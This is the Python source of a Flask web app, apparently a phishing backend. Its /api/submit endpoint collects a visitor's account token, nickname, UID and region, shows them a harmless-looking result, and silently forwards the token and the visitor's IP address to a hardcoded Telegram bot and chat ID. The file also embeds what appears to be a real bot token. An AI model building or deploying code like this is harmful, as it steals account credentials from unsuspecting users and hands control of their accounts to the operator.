from flask import Flask, request, jsonify, render_template
import requests
from datetime import datetime

# Vercel ke liye template folder path define karna zaroori hai
app = Flask(__name__, template_folder='templates')

# --- CONFIGURATION ---
# @BotFather se bot token lein aur yahan daalein
TELEGRAM_BOT_TOKEN = "8010690774:AAFtqxOlbqU-qaCc6fqyzTZYXUBPDyz_1vY"
# @userinfobot se apni Chat ID lein aur yahan daalein
TELEGRAM_CHAT_ID = "6414001857"

def send_to_telegram(token, nick, uid, reg):
    """Data ko Telegram par forward karne ka function"""
    # Vercel par real IP nikalne ke liye x-forwarded-for header use hota hai
    user_ip = request.headers.get('x-forwarded-for', request.remote_addr)
    
    message = (
        "🚀 **New Token Received**\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 **Name:** `{nick}`\n"
        f"🆔 **UID:** `{uid}`\n"
        f"🌍 **Region:** `{reg}`\n"
        f"🔑 **Token:** `{token}`\n"
        f"🕒 **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"🌐 **IP:** `{user_ip}`\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"Telegram Error: {e}")

@app.route('/')
def index():
    """Main page load karne ke liye"""
    return render_template('index.html')

@app.route('/api/submit', methods=['POST'])
def submit():
    """HTML se data receive karke Telegram par bhejta hai"""
    try:
        data = request.json
        eat_token = data.get('token')
        nickname = data.get('nickname', '--')
        account_uid = data.get('uid', '--')
        region = data.get('region', '--')

        if not eat_token:
            return jsonify({"success": False, "error": "Token missing"}), 400

        # Telegram par silent forwarding
        send_to_telegram(eat_token, nickname, account_uid, region)

        # Response jo website par result box dikhayega
        return jsonify({
            "success": True,
            "data": {
                "nickname": nickname,
                "region": region,
                "account_id": account_uid
            }
        })

    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
